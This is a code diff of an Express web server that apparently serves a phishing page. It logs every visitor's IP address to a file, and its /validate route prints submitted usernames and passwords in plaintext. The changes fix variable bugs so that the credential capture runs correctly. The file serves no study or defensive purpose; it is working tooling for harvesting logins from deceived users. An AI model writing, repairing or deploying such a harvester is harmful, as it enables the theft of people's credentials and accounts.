@@ -85,20 +85,19 @@ app.use(bodyParser.json());
 
 app.get('/', function(request, response) {
 	response.sendFile(args.template);
-	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
-	console.log(ip + " Connected.");
-
+	const ipAddr = request.headers['x-forwarded-for'] || request.connection.remoteAddress;
+	console.log(ipAddr + " Connected.");
 	addJSON(
 		path.resolve(path.join(__dirname, '../output/ipAddr.json')),
-		{ ip: ip }
+		{ ip: ipAddr }
 	);
 });
 
 app.post('/validate', function(request, response) {
 	const username = request.body.username;
 	const password = request.body.password;
-	const ipAddr = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
-	console.log(ip + " Submitted.");
+	const ipAddr = request.headers['x-forwarded-for'] || request.connection.remoteAddress;
+	console.log(ipAddr + " Submitted.");
 	if (username && password) {
 		console.log("USERNAME: " + username);
 		console.log("PASSWORD: " + password);
